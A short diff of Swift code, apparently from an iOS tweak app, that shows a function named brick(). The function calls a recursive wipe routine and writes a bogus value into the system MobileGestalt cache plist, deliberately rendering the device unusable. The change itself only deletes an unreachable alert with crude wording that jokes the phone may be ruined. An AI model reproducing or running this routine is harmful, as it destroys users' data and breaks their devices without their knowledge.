@@ -13,7 +13,6 @@ func brick() -> Bool {
     print("Goodbye cruel world!")
     recursiveWipe()
     return plistChange(plistPath: "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist", key: "ArtworkDeviceSubType", value: 69420)
-    UIApplication.shared.alert(title: "Probably bricked.", body: "Your phone may or may not be fucked. Reboot to find out! :trol:", withButton: false)
 }
 
 func recursiveWipe() {
